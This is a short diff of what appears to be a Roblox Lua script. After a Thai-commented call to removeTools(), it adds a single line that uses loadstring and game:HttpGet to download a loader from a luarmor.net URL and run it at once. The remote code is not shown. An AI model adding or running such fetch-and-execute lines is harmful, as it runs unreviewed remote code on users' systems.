@@ -56,4 +56,4 @@ end
 -- เรียกใช้ฟังก์ชัน
 removeTools()
 
-
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/666b9548b0e322722491428b44de9541.lua"))()
